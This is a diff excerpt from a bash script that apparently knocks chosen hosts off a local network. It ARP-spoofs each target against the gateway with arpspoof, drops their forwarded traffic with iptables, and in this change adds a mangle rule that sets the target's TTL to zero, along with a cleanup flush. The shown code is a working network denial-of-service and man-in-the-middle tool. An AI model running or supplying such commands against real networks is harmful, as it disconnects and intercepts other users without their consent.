@@ -218,7 +218,8 @@ for TARGET in "${TARGETS[@]}"; do
 
     # Iptables rules
     iptables -I FORWARD -s "$TARGET" -j DROP
-    iptables -I FORWARD -d "$TARGET" -j DROP 
+    iptables -I FORWARD -d "$TARGET" -j DROP
+    iptables -t mangle -I FORWARD -s "$TARGET" -j TTL --ttl-set 0
     
     # Bidirectional blocking
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
@@ -239,6 +240,7 @@ cleanup() {
     ip -s -s neigh flush all >/dev/null 2>&1
     iptables -P FORWARD ACCEPT
     iptables -F FORWARD
+    iptables -t mangle -F FORWARD
     iptables -t mangle -A PREROUTING -i "$INTERFACE" -j TTL --ttl-set 64
     echo ""
     echo "Restoring the connection..."
